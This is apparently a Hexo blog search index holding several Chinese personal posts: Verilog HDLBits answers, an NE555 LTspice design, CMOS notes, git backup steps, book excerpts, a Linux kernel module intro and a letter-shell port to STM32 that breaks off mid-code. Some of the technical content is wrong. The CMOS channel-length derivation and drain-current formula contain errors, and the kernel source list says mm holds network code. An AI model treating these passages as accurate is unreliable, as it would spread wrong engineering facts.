<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HDLBits随笔</title>
      <link href="/2025/04237414.html"/>
      <url>/2025/04237414.html</url>
      
        <content type="html"><![CDATA[<h2 id="Popcount3"><a href="#Popcount3" class="headerlink" title="Popcount3"></a>Popcount3</h2><p>A “population count” circuit counts the number of ‘1’s in an input vector. Build a population count circuit for a 3-bit input vector.</p><h3 id="Module-Declaration"><a href="#Module-Declaration" class="headerlink" title="Module Declaration"></a>Module Declaration</h3><pre class="line-numbers language-lang-verilog"><code class="language-lang-verilog">module top_module(     input [2:0] in,    output [1:0] out );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="answer"><a href="#answer" class="headerlink" title="answer"></a>answer</h3><pre class="line-numbers language-lang-verilog"><code class="language-lang-verilog">module top_module(     input [2:0] in,    output [1:0] out );    assign out = in[0] + in[1] + in[2];endmodule<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Gatesv"><a href="#Gatesv" class="headerlink" title="Gatesv"></a>Gatesv</h2><p>You are given a four-bit input vector in[3:0]. We want to know some relationships between each bit and its neighbour:</p><p>out_both: Each bit of this output vector should indicate whether both the corresponding input bit and its neighbour to the left (higher index) are ‘1’. For example, out_both[2] should indicate if in[2] and in[3] are both 1. Since in[3] has no neighbour to the left, the answer is obvious so we don’t need to know out_both[3].<br>out_any: Each bit of this output vector should indicate whether any of the corresponding input bit and its neighbour to the right are ‘1’. For example, out_any[2] should indicate if either in[2] or in[1] are 1. Since in[0] has no neighbour to the right, the answer is obvious so we don’t need to know out_any[0].<br>out_different: Each bit of this output vector should indicate whether the corresponding input bit is different from its neighbour to the left. For example, out_different[2] should indicate if in[2] is different from in[3]. For this part, treat the vector as wrapping around, so in[3]’s neighbour to the left is in[0].</p><h3 id="Module-Declaration-1"><a href="#Module-Declaration-1" class="headerlink" title="Module Declaration"></a>Module Declaration</h3><pre class="line-numbers language-lang-verilog"><code class="language-lang-verilog">module top_module(     input [3:0] in,    output [2:0] out_both,    output [3:1] out_any,    output [3:0] out_different );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://hdlbits.01xz.net/wiki/Gatesv">link</a></p><h3 id="answer-1"><a href="#answer-1" class="headerlink" title="answer"></a>answer</h3><pre class="line-numbers language-lang-verilog"><code class="language-lang-verilog">module top_module(     input [3:0] in,    output [2:0] out_both,    output [3:1] out_any,    output [3:0] out_different );     integer i;    always@(*)        begin            for(i=0;i<3;i=i+1)                begin            out_both[i] = in[i+1]&in[i];            out_any[i+1] = in[i+1]|in[i];            out_different[i] = in[i+1] ^ in[i];                 end         end    assign  out_different[3] = in[3]^in[0];endmodule<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Gatesv100"><a href="#Gatesv100" class="headerlink" title="Gatesv100"></a>Gatesv100</h2><p>You are given a 100-bit input vector in[99:0]. We want to know some relationships between each bit and its neighbour:</p><p>out_both: Each bit of this output vector should indicate whether both the corresponding input bit and its neighbour to the left are ‘1’. For example, out_both[98] should indicate if in[98] and in[99] are both 1. Since in[99] has no neighbour to the left, the answer is obvious so we don’t need to know out_both[99].<br>out_any: Each bit of this output vector should indicate whether any of the corresponding input bit and its neighbour to the right are ‘1’. For example, out_any[2] should indicate if either in[2] or in[1] are 1. Since in[0] has no neighbour to the right, the answer is obvious so we don’t need to know out_any[0].<br>out_different: Each bit of this output vector should indicate whether the corresponding input bit is different from its neighbour to the left. For example, out_different[98] should indicate if in[98] is different from in[99]. For this part, treat the vector as wrapping around, so in[99]’s neighbour to the left is in[0].</p><h3 id="Module-Declaration-2"><a href="#Module-Declaration-2" class="headerlink" title="Module Declaration"></a>Module Declaration</h3><pre class="line-numbers language-lang-verilog"><code class="language-lang-verilog">module top_module(     input [99:0] in,    output [98:0] out_both,    output [99:1] out_any,    output [99:0] out_different );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://hdlbits.01xz.net/wiki/Gatesv100">link</a></p><h3 id="answer-2"><a href="#answer-2" class="headerlink" title="answer"></a>answer</h3><pre class="line-numbers language-lang-verilog"><code class="language-lang-verilog">    module top_module(     input [99:0] in,    output [98:0] out_both,    output [99:1] out_any,    output [99:0] out_different );    integer i;    always@(*)        begin            for(i=0;i<99; i=i+1)                begin                    out_both[i] = in[i+1] & in[i];                    out_any[i+1] = in[i+1] | in[i];                    out_different[i] = in[i+1] ^ in[i];                end        end    assign out_different[99] = in[99]^in[0];endmodule<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Mux2to1"><a href="#Mux2to1" class="headerlink" title="Mux2to1"></a>Mux2to1</h2><p>Create a one-bit wide, 2-to-1 multiplexer. When sel=0, choose a. When sel=1, choose b.</p><p>Expected solution length: Around 1 line.</p><h3 id="Module-Declaration-3"><a href="#Module-Declaration-3" class="headerlink" title="Module Declaration"></a>Module Declaration</h3><pre class="line-numbers language-lang-verilog"><code class="language-lang-verilog">module top_module(     input a, b, sel,    output out );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><a href="https://hdlbits.01xz.net/wiki/Mux2to1">link</a></p><h3 id="answer-3"><a href="#answer-3" class="headerlink" title="answer"></a>answer</h3><pre class="line-numbers language-lang-verilog"><code class="language-lang-verilog">module top_module(     input a, b, sel,    output out );     assign out = (sel == 0 ? a : b);endmodule<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Mux2to1v"><a href="#Mux2to1v" class="headerlink" title="Mux2to1v"></a>Mux2to1v</h2><p>Create a 100-bit wide, 2-to-1 multiplexer. When sel=0, choose a. When sel=1, choose b.</p><p>Expected solution length: Around 1 line.</p><h3 id="Module-Declaration-4"><a href="#Module-Declaration-4" class="headerlink" title="Module Declaration"></a>Module Declaration</h3><pre class="line-numbers language-lang-verilog"><code class="language-lang-verilog">module top_module(     input [99:0] a, b,    input sel,    output [99:0] out );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://hdlbits.01xz.net/wiki/Mux2to1v">link</a></p><h3 id="answer-4"><a href="#answer-4" class="headerlink" title="answer"></a>answer</h3><pre class="line-numbers language-lang-verilog"><code class="language-lang-verilog">module top_module(     input [99:0] a, b,    input sel,    output [99:0] out );    assign out = (sel == 0 ? a : b);endmodule<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> verilog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Ltspice仿真ne555电路产生2Hz占空比为20%方波</title>
      <link href="/2024/11263229.html"/>
      <url>/2024/11263229.html</url>
      
        <content type="html"><![CDATA[<h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>这是某个比赛的题目，觉得好玩写成博客。</p><h1 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h1><p>材料有：NE555 、 与非门 、分频器，要求产生信号频率为2Hz高电平占空比为20%。且分频为1Hz。</p><h1 id="思路-amp-计算"><a href="#思路-amp-计算" class="headerlink" title="思路&amp;计算"></a>思路&amp;计算</h1><p>NE555工作在无稳态模式（Astable Mode）时，其占空比通常不能低于50%。所以我们可以换个思路，先产生80%的占空比的信号再反相则能得到20%的占空比。</p><script type="math/tex; mode=display">D = \frac{R_1+R_2}{R_1+2\times R_2} = 0.2</script><p>得</p><script type="math/tex; mode=display">R_1 = 3 \times R_2</script><script type="math/tex; mode=display">T = 0.693 \times (R_1 + 2 \times R_2) \times C = 0.5</script><p>得R1 = 4329(ohm), R2 = 1443(ohm), C = 100uf</p><h1 id="电路"><a href="#电路" class="headerlink" title="电路"></a>电路</h1><p><img src="/images/11_26_c.png" alt="电路"><br>ltspice的逻辑门模型<a href="https://www.digikey.cn/zh/forum/t/topic/1349">下载</a><br>ltspice的D触发器模型<a href="https://github.com/Andre-EE/LTSpice_Logic">下载</a><br><img src="/images/11_26_fan.png" alt="反相后"><br><img src="/images/11_26_f.png" alt="分频后"></p>]]></content>
      
      
      <categories>
          
          <category> LTspice </category>
          
      </categories>
      
      
        <tags>
            
            <tag> electron </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈CMOS其一</title>
      <link href="/2024/102125833.html"/>
      <url>/2024/102125833.html</url>
      
        <content type="html"><![CDATA[<h1 id="跨导"><a href="#跨导" class="headerlink" title="跨导"></a>跨导</h1><p>源漏之间的线性电阻可以表示为</p><script type="math/tex; mode=display">R_{on}=\frac{1}{\mu _n C_{ox}\frac{W}{L}(V_{GS}-V_{TH})}</script><p>也可以看为阻值由驱动电压控制的电阻。$\frac{W}{L}$是宽长比。<br>当 </p><script type="math/tex; mode=display">V_{DS}<2(V_{GS}-V_{TH})</script><p>时器件工作在深三极管区，相反当 </p><script type="math/tex; mode=display">V_{DS}>V_{GS}-V_{TH}</script><p>时，漏极并不遵行抛物线特性且工作在饱和区。<br>漏极电压必须大于或等于驱动电压（由公式可以看出）<br>跨导为$R_{on}$的倒数通常定义在饱和区</p><script type="math/tex; mode=display">g_m=\mu _n C_{ox}\frac{W}{L}(V_{GS}-V_{TH})</script><p>同时也可以表示为</p><script type="math/tex; mode=display">g_m = \sqrt{2\mu C_{ox}\frac{W}{L}I_D}</script><h1 id="沟道长度调制"><a href="#沟道长度调制" class="headerlink" title="沟道长度调制"></a>沟道长度调制</h1><p>当G与D之间的电压差增大时，实际上的反型沟道长度在逐渐减少。<br>定义沟道长度为$L$减少后的长度为$L \prime$则 $L=L \prime -\Delta L$<br>定义$\frac{\delta L}{L}=\lambda V_{DS}$<br>则可以通过简单运算得到如下：</p><script type="math/tex; mode=display">\frac{1}{L'} = \frac{1}{L - \Delta L} = \frac{L + \Delta L}{L^2 {\Delta L}^2}</script><p>$\Delta L$可以省略则可以得到<br>$\frac{L + \Delta L}{L^2} =\frac{1 + \frac{\Delta L}{L}}{L}$<br>$\frac{1}{L’}=\frac{1+\lambda V_{DS}}{L}$<br>将上述带入公式则可以得到</p><script type="math/tex; mode=display">I_D=\frac{1}{2}\frac{W}{L}\mu _n C_{ox}(V_{GS} - V_{TH}^2)(1+\lambda V_{GS})</script>]]></content>
      
      
      <categories>
          
          <category> 电子 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo 博客备份</title>
      <link href="/2024/10213925.html"/>
      <url>/2024/10213925.html</url>
      
        <content type="html"><![CDATA[<h1 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h1><p>废话少说之间上教程：</p><h2 id="1-创建-GitHub-私密仓库："><a href="#1-创建-GitHub-私密仓库：" class="headerlink" title="1.创建 GitHub 私密仓库："></a>1.创建 GitHub 私密仓库：</h2><p>登录你的 GitHub 账户，点击右上角的 “+” 按钮，选择 “New repository”。<br>输入仓库名称，选择 “Private” 选项，点击 “Create repository”。</p><h2 id="2-安装-Git（如果尚未安装）："><a href="#2-安装-Git（如果尚未安装）：" class="headerlink" title="2.安装 Git（如果尚未安装）："></a>2.安装 Git（如果尚未安装）：</h2><p>在你的系统上安装 Git。可以从 Git 官网 下载并按照说明进行安装。</p><h2 id="3-在本地初始化-Git："><a href="#3-在本地初始化-Git：" class="headerlink" title="3.在本地初始化 Git："></a>3.在本地初始化 Git：</h2><p> 打开终端（或命令提示符），导航到你的 Hexo 博客根目录：<br>复制代码</p><pre class="line-numbers language-lang-shell"><code class="language-lang-shell">git init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-添加远程仓库："><a href="#4-添加远程仓库：" class="headerlink" title="4.添加远程仓库："></a>4.添加远程仓库：</h2><p>运行命令，将你刚创建的私密仓库添加为远程：<br>复制代码</p><pre class="line-numbers language-lang-shell"><code class="language-lang-shell">git remote add origin https://github.com/你的用户名/你的仓库名.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加文件并提交：</p><h2 id="5-将所有文件添加到-Git："><a href="#5-将所有文件添加到-Git：" class="headerlink" title="5.将所有文件添加到 Git："></a>5.将所有文件添加到 Git：</h2><p>复制代码</p><pre class="line-numbers language-lang-shell"><code class="language-lang-shell">git add .<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提交更改：</p><p>复制代码</p><pre class="line-numbers language-lang-shell"><code class="language-lang-shell">git commit -m "备份 Hexo 博客"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6-推送到远程仓库："><a href="#6-推送到远程仓库：" class="headerlink" title="6.推送到远程仓库："></a>6.推送到远程仓库：</h2><p>将本地的内容推送到 GitHub：<br>复制代码</p><pre class="line-numbers language-lang-shell"><code class="language-lang-shell">git push -u origin master<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果是首次推送，可能会要求输入 GitHub 的用户名和密码（或使用 token）。<br>后续更新：</p><p>每当你对博客进行更新后，重复第 5 步和第 6 步来提交和推送更改。</p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>纳瓦尔宝典阅读摘抄</title>
      <link href="/2024/100955011.html"/>
      <url>/2024/100955011.html</url>
      
        <content type="html"><![CDATA[<h1 id="好句摘抄-amp-反思"><a href="#好句摘抄-amp-反思" class="headerlink" title="好句摘抄&amp;反思"></a>好句摘抄&amp;反思</h1><ul><li>如果社会可以培训你，那么社会也可以培训他人来取代你。大家都能学会的东西是不可能让你致富的。凡是可以批量化培训的技能都是能够被雇佣的技能。只有你自己学到的东西，才是属于你独有的能力，才有可能让你创业成功。</li><li>没有所谓的“商业”技能。不要把时间浪费在商业杂志和商业课程上</li><li>阅读数学、科学和哲学领域的经典作品。不要读畅销书，不要看新闻。避免加入任何所谓的“读书俱乐部”​，避免追求任何的社群认同。把真理置于社群认同之上。</li><li>赚钱不是一件想做就能做的事情，而是一门需要学习的技能。</li><li>财富是指在你睡觉时仍能为你赚钱的资产。(能产生现金流)</li><li>依靠出租时间是不可能致富的。你必须拥有股权（企业的部分所有权）​，才能实现财务自由。(真正的财富自由不是想买什么买什么，而是可以不去靠出租时间获得财富。能够自给自足。)</li><li>要想有所专长，就要追求真正的兴趣和热爱，而不是盲目追逐热点</li><li>你应该忙得没时间社交，但依然把日程安排得井然有序（专注于提升自己，而不是把时间花费在抖音、IG和其他视频游戏）</li><li>世界上没有快速致富的教程。即使有，那也只是提供教程的人想从你身上赚钱。（羊毛出自羊身上）</li><li>运用专长，发挥杠杆效应，最终你会得到自己应得的。（杠杆即使复利，汇报呈现指数级）</li><li>我能提供什么独特的价值？（将自己提升至“产品化”，让别人无可替代）</li><li>找到天赋所在，积累专长（事半功倍）</li><li>在“成为自己”这件事情上，没有人能比得过你。其实，人生大部分时间都是在寻找，寻找那些最需要你的人，寻找那些最需要你的事情。</li><li>互联网极大地拓宽了职业空间。大多数人还没有清晰地认识到这一点。通过互联网，每个人都可以找到自己的受众。只要在网上进行独特的自我表达，你就有机会传播快乐，累积财富，打造产品，创立企业。</li><li>只有独辟蹊径，才能避开竞争。</li><li>如果社会可以培训你，那么总有一天，社会也可以编写代码，用计算机取代你。</li><li>靠出租自己的时间是永远无法致富的。（所以要学会使用杠杆，用头脑赚钱而不是用时间）</li><li>人生的一大目标应该是掌控自己的时间。</li><li>想加入一家伟大的科技公司，销售技能和构建技能必备其一。如果二者都不具备，那就去学习。</li><li>要具有出色的判断力——尤其是经过实操验证的判断力，以及高度的责任感和优秀的业绩记录，这几点至关重要。</li><li>金钱不能解决所有问题，但可以解决所有和金钱有关的问题。</li><li>人生早期有三个重大决定：在哪里生活，和谁在一起，从事什么职业。</li><li>生活就是由一个又一个游戏组成的。</li><li>我只是遵从内心的感受和想法，过好每一天。我是真的只活在当下。</li><li>避开竞争陷阱的方法就是做独一无二的自己，找到自己能做到独步天下的事情。</li><li>无论是在商业、科学还是政治领域，青史留名的总是那些艺术家。</li><li>钱不是万恶之源。钱本身是无罪的，真正有害的是对钱的贪欲。</li><li>我认为，赚钱很关键的一点就是知名度和信誉度，也就是说，大家要知道你、信任你，这样人们便会通过你达成某些交易。</li><li>人品和声誉是可以自己建立的。一旦有了人品和声誉，你就会有很多机会。</li><li>做一个创造者，创造出人们想要的有趣的东西。展示你的技能，练习你的技能，最终会有合适的人找到你。​</li><li>如果一个人大谈特谈自己有多诚实，那么他很可能是不诚实的。这只是我学到的一个小小的警示信号。当一个人不断宣扬自己的价值观，或者自我吹嘘时，那就意味着他在掩饰什么。</li><li>你越想接近我，你的价值观就必须越正确。</li><li>运用专长，结合杠杆效应，最终，你的才华和努力会得到相应的回报。</li><li>真正聪明的人，从不走捷径。</li><li>把时间花在省钱上是不会致富的。省出时间来赚钱才是正确的思路。</li><li>真正的知识具有内在的关联性，就像一根链条，从基础层面到应用层面环环相扣。以数学为例，如果不懂算术和几何，你就无法理解三角函数。如果有人用词花哨，动辄谈论宏大而复杂的概念，那么他们很有可能并不了解自己所谈论的东西。我认为最聪明的人是可以把事情深入浅出地给孩子讲解清楚的人，否则他自己也没有真正理解。</li><li>真正聪明的人是思路清晰的思考者。他们把基础知识和基础层面了解得非常透彻。</li><li>阻碍我们看清现实的最大因素就是我们对现实“应有的样子”有先入为主的印象。</li><li>自我越弱小，对自己反应的限制越少，对自己想要的结果的执念越低，就越容易看清现实。</li><li>我深知，越是渴望以某种特定的方式解决问题，我就越不可能看清事实。</li><li>留出空闲时间非常重要(留下时间进行思考)</li><li>非常聪明的人往往都是特立独行的，他们坚持独立思考、亲力亲为，以厘清事情的来龙去脉。</li><li>要持续成长，很重要的一点是学会打破现有的条件反射，改掉不良习惯。要善于剖析自我，梳理每个习惯是怎样形成的。</li><li>不要欺骗自己，你自己才是最容易被欺骗的人。</li><li>我只关注事实，我思考问题的角度是“事实就是这样”​，或者“事实不是这样”​。——理查德·费曼</li><li>越觉得自己无所不知，规避和处置风险的方法越少。</li><li>大脑会过分看重短期快乐，试图避免短期痛苦。</li><li>海量阅读，多多益善。</li><li>阅读自己喜欢的题材，直到热爱阅读。</li><li>不要比谁读书更快。书越好，你越要慢慢阅读、慢慢吸收。</li><li>指出别人观点中明显的偏颇，意味着要么你攻击的对象不聪明，要么你自身不聪明。</li><li>如果一本书被写出来只是为了赚钱，那么不要读它。</li><li>相较于做一些不是自己百分之百想要做的事情，努力调整欲望更重要。</li><li>幸福的自然属性是平和。</li><li>幸福源于好习惯。</li><li>工作时，和比自己更成功的人在一起。玩耍时，和比自己更快乐的人在一起。</li><li>幸福指数的个人衡量标准是，一天中你有多少时间用于履行职责，而不是追随兴趣。</li><li>最了不起的超能力就是改变自我的能力。</li><li>想要拥有内心的平静，必须先拥有身体的平静。</li><li>有想法就直接采取行动，就是这么简单。</li><li>迅速采取行动，并对结果保持耐心。</li><li>要想不借助自律而实现自我提升，你需要更新自我形象。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 摘抄 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux驱动开发介绍上</title>
      <link href="/2024/100817950.html"/>
      <url>/2024/100817950.html</url>
      
        <content type="html"><![CDATA[<hr><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="安装必要的软件"><a href="#安装必要的软件" class="headerlink" title="安装必要的软件"></a>安装必要的软件</h2><pre class="line-numbers language-lang-bash"><code class="language-lang-bash">sudo apt-get update  sudo apt-get install gawk wget git diffstat unzip texinfo \  gcc-multilib build-essential chrpath socat libsdl1.2-dev \  xterm ncurses-dev lzop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ol><li>可以自己下载源码自己编译（可以自己百度）</li><li>可以之间使用/usr/src理的文件</li><li>一键小白模式：sudo apt-get install linux-headers-$(uname -r)</li></ol><h2 id="源码结构"><a href="#源码结构" class="headerlink" title="源码结构"></a>源码结构</h2><ul><li>arch 支持的体系结构</li><li>block 包含存储设备代码，实际上也即是调度算法</li><li>crypto 存放包含命令API和加密算法代码</li><li>Documentation 包含不同内核框架和子系统使用API的描述</li><li>drivers 最重要的目录，设备驱动都在这个目录</li><li>fs 包含内核支持的不通过文件系统的实现</li><li>include 包含内核的头文件</li><li>init 包含初始化和启动代码</li><li>ipc 包含进程间通讯（IPC）机制的实现，入消息队列、信号量和共享内存</li><li>kernel 包含基本内核中与体系架构无关的部分</li><li>lib 包含库函数和一些辅助函数，分别是内核对象处理程序和循环冗余计算函数</li><li>mm 该目录包含网络协议相关代码</li><li>scripts 包含在内核开发过程中使用的脚本和工具，还有其他有用工具</li><li>security 包含安全框架相关代码</li><li>sound 包含音频子系统代码</li><li>usr 目录包含了initramfs的实现</li></ul><h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><h2 id="内核驱动和用户空间"><a href="#内核驱动和用户空间" class="headerlink" title="内核驱动和用户空间"></a>内核驱动和用户空间</h2><p>内核有是特权的，而用户程序则时受限的。</p><ul><li>内核空间：内核驻留和运行的地址空间。内核内存（或内核空间）时由内核拥有的内存范围，受访问标志保护，防止任何用户程序有意或无意于内核搞混。另一方面，内核可以访问整个系统内存，因为它在系统上以更高的优先权运行。在内核模式下，CPU可以访问整个内存（内核空间和用户空间）</li><li>用户空间：正常程序（如gedit等）被限制运行（地址）空间。可以将其视为沙盒或监狱，以便用户程序不能混用其他程序拥有的内存或任何其他资源。在用户模式下，CPU只能访问标有用户空间访问权限的内存。用户应用程序运行到内核空间唯一方法时通过系统调用，其中一些调用是read、write、open、close和mmap等。用户空间代码以较低的优先级运行。当进程系统调用是，软件中断被发送到内核，这将打开特权模式，以便该进程在内核空间中运行。系统调用返回时，内核关闭特权模式，进程再次受限。</li></ul><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><h3 id="手动加载"><a href="#手动加载" class="headerlink" title="手动加载"></a>手动加载</h3><pre class="line-numbers language-lang-bash"><code class="language-lang-bash">sudo insmod project.ko<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="手动卸载"><a href="#手动卸载" class="headerlink" title="手动卸载"></a>手动卸载</h3><pre class="line-numbers language-lang-bash"><code class="language-lang-bash">sudo rmmod project.ko<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-lang-c"><code class="language-lang-c">#include <linux/init.h>  #include <linux/module.h>  #include <linux/kernel.h>  static int __init helloworld_init(void) &#123;      pr_info("Hello world!\n");      return 0;  &#125;static void __exit helloworld_exit(void) &#123;      pr_info("End of the world\n");  &#125;   module_init(helloworld_init);  module_exit(helloworld_exit);  MODULE_AUTHOR("haclm");  MODULE_LICENSE("GPL");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>使用make工具进行编译</p><pre class="line-numbers language-lang-makefile"><code class="language-lang-makefile">obj-m = project_name.oall:        make -C /lib/modules/6.1.0-25-amd64/build M=$(PWD) modulesclean:        make -C /lib/modules/6.1.0-25-amd64/build M=(PWD) clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者</p><pre class="line-numbers language-lang-makefile"><code class="language-lang-makefile">ARCH=x86CROSS_COMPILE=KVERSION = $(shell uname -r)KERN_DIR =  /lib/modules/$(KVERSION)/build all:    make -C $(KERN_DIR) M=`pwd` modules clean:    make -C $(KERN_DIR) M=`pwd` modules clean    rm -rf modules.orderobj-m    += helloworld.o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译命令</p><pre class="line-numbers language-lang-bash"><code class="language-lang-bash">make<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>编译好后将模块手动加载，使用下列命令可以看到现象</p><pre class="line-numbers language-lang-bash"><code class="language-lang-bash">sudo dmesg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 嵌入式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈费曼学习法</title>
      <link href="/2024/081444064.html"/>
      <url>/2024/081444064.html</url>
      
        <content type="html"><![CDATA[<h1 id="核心"><a href="#核心" class="headerlink" title="核心"></a>核心</h1><p>费曼学习法的核心就是把被动学习改变为主动学习。以教代学。</p><h1 id="具体的步骤"><a href="#具体的步骤" class="headerlink" title="具体的步骤"></a>具体的步骤</h1><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p>学习的大前提是得有知识的输入。先确定要学习的概念或知识点，然后就去找资料等方式去了解理解这个概念或知识点。</p><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>如果觉得自己已经掌握这个概念或知识点了，可以设想自己为老师在教一位10岁左右的儿童。因为10岁的儿童没有办法理解太复杂抽象的概念和知识，要求用简单的话语解释。当然啦~，不一定非得是小孩，普通人也行。主要就是输入把复杂的知识概念用通俗易懂的话语描述出来，如果不能就要回到第一步去输入。如此循环直到自己能把知识说明白且通俗易懂，那才是自己掌握了知识。</p><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>方法虽好，但贵在坚持。如果不能去坚持使用费曼学习法，就算此方法很好却也发挥不了太大用处。</p>]]></content>
      
      
      <categories>
          
          <category> 个人提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 高效学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>stm32搭配freertos移植letter</title>
      <link href="/2024/06178348.html"/>
      <url>/2024/06178348.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一个功能强大的嵌入式shell，您可以查看它的<a href="https://github.com/NevermindZZT/letter-shell">GitHub</a></p><p>letter_shell是一个C语言编写的，可以嵌入在程序中的嵌入式shell，主要面向嵌入式设备，以C语言函数为运行单位，可以通过命令行调用，运行程序中的函数。通过移植这个工具，方便我们进行模块的单元测试。</p><h1 id="移植"><a href="#移植" class="headerlink" title="移植"></a>移植</h1><p>我们得先下载的文件，可以通过下载ZIP文件或者通过git clone命令克隆它。<br>这里不在赘述。</p><p>关于Freertos移植这里也不在赘述，可以看往期博客。</p><ul><li>1.要配置好UART和中断(不在赘述)</li><li>2.配置一个GPIO进行点亮LED(可选)</li></ul><p>首先先将src文件夹里的文件导入到项目里。在dome文件夹里找到stm32-freertos并把里面的文件导入工程里。并把它们配置好Incldue Path 和 Source Path。</p><p>打开shell_port.c文件并修改一些代码</p><ul><li>1.#include “serial.h”（注释掉） #include “cevent.h” #include “log.h”（可选择注释掉）</li><li>2.改userShellWrite函数和userShellRead函数，可以参考入校</li></ul><pre class="line-numbers language-lang-c"><code class="language-lang-c">short userShellWrite(char *data, unsigned short len)&#123;//   serialTransmit(&debugSerial, (uint8_t *)data, len, 0x1FF);     HAL_UART_Transmit(&huart1, (uint8_t *)data, len, 0x1FF);    return len;&#125;</code></pre><pre><code>short userShellRead(char *data, unsigned short len)&#123; //   return serialReceive(&debugSerial, (uint8_t *)data, len, 0);    if(HAL_UART_Receive(&huart1, (uint8_t*)data, len, 0xFFFF) != HAL_OK)    &#123;        return 0;    &#125;    else    &#123;        return 1;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>3.修改下述函数</li></ul><pre class="line-numbers language-lang-c"><code class="language-lang-c">/** * @brief 用户shell上锁 *  * @param shell shell *  * @return int 0 */int userShellLock(Shell *shell)&#123;//    xSemaphoreTakeRecursive(shellMutex, portMAX_DELAY);    xSemaphoreTake(shellMutex, portMAX_DELAY);    return 0;&#125;/** * @brief 用户shell解锁 *  * @param shell shell *  * @return int 0 */int userShellUnlock(Shell *shell)&#123;//    xSemaphoreGiveRecursive(shellMutex);    xSemaphoreGive(shellMutex);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-lang-c"><code class="language-lang-c">void userShellInit(void)&#123;    shellMutex = xSemaphoreCreateMutex();    shell.write = userShellWrite;    shell.read = 